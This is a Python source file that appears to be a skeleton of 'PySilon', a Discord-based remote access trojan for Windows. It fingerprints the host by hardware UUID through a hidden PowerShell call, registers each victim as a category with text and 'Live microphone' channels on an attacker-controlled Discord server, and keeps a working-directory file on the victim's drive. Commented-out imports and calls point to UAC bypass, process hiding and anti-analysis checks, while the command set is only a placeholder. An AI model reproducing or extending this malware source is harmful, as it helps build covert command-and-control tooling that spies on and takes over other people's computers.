import os
import sys
import json
import ctypes
import discord
import subprocess
from getpass import getuser
from discord.ext import commands
from urllib.request import urlopen
#import resources.modules.uac_bypass as uac_bypass
#import resources.modules.hide_process as proc_hider
#import resources.modules.protections as pysilon_protections

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
# Don't edit anything in this file. Everything will be handled by compiler. #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#begin_configuration
bot_token = ''
guild_ids = []
channel_ids = {'main': True, 'spam': True, 'live': False, 'vrec': False}
#end_configuration

class PySilon(commands.Bot):
    def __init__(self, command_prefix, self_bot) -> None:
        #def IsAdmin() -> bool: return ctypes.windll.shell32.IsUserAnAdmin() == 1
        #if pysilon_protections.protection_check(): os._exit(0)
        #if pysilon_protections.single_instance_lock(): os._exit(0)

        #if not IsAdmin():
        #    if uac_bypass.GetSelf()[1]:
        #        if uac_bypass.UACbypass(): os._exit(0)
        #else:
        #    proccess_was_hidden = False
        #    if proc_hider.hide_process(): proccess_was_hidden = True

        self.load_bot(command_prefix, self_bot)

    async def first_run_check(self) -> None:
        guild_id, guild_id_index = guild_ids[0], 0
        hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
        category_not_found = True
        for _ in guild_ids:
            for category_name in self.get_guild(guild_id).categories:
                if hwid in str(category_name):
                    await self.sequent_run(category_name)
                    return
            if guild_id_index != len(guild_ids)-1:
                guild_id_index += 1
                self.guild_id = guild_ids[guild_id_index]
            else: break

        if category_not_found:
            for guild in guild_ids:
                get_guild = self.get_guild(guild)
                if len(get_guild.channels) < 495:
                    self.guild_id = guild
                    break

        await self.first_run(guild_id, hwid)

    async def first_run(self, guild_id, hwid) -> None:
        self.working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; self.save_working_dir()
        category = await self.get_guild(guild_id).create_category(hwid)
        temp = await self.get_guild(guild_id).create_text_channel('main', category=category); channel_ids['main'] = temp.id
        temp = await self.get_guild(guild_id).create_voice_channel('Live microphone', category=category); channel_ids['voice'] = temp.id

    async def sequent_run(self, category) -> None:
        self.fetch_working_dir()
        if self.working_directory == None or self.working_directory == []: self.working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; self.save_working_dir()
        category_channel_names = []
        for channel in category.channels:
            category_channel_names.append(channel.name)

        if 'main' not in category_channel_names and channel_ids['main']:
            temp = await self.get_guild(self.guild_id).create_text_channel('main', category=category)
            channel_ids['main'] = temp.id

        if 'Live microphone' not in category_channel_names and channel_ids['live']:
            temp = await self.get_guild(self.guild_id).create_voice_channel('Live microphone', category=category)
            channel_ids['voice'] = temp.id

    def load_bot(self, command_prefix, self_bot) -> None:
        commands.Bot.__init__(self, command_prefix=command_prefix, self_bot=self_bot, intents=discord.Intents.all())

        self.guild_id = 1178999695570374697
        self.channel_id = 1262286966205059082

        self.load_commands()

    async def on_ready(self):
        await self.get_channel(self.channel_id).send('Bot is ready')
        await self.first_run_check()

    def load_commands(self):
        @self.command(name="server", pass_context=True)
        async def server(ctx):
            await ctx.channel.send('asdasd')
        
        #commands.intendation=2
        
    def fetch_working_dir(self):
        try:
            with open(f'{os.path.dirname(sys.executable)}\\working_directory.json', 'r') as fetch_dir:
                self.working_directory = json.load(fetch_dir)
        except:
            self.save_working_dir()
            self.working_directory = [os.getenv('SystemDrive'), "Users", getuser()]
        return self.working_directory

    def save_working_dir(self):
        with open(f'{os.path.dirname(sys.executable)}\\working_directory.json', 'w') as save_dir:
            json.dump(self.working_directory, save_dir)

bot = PySilon(command_prefix='.', self_bot=False)
bot.run('')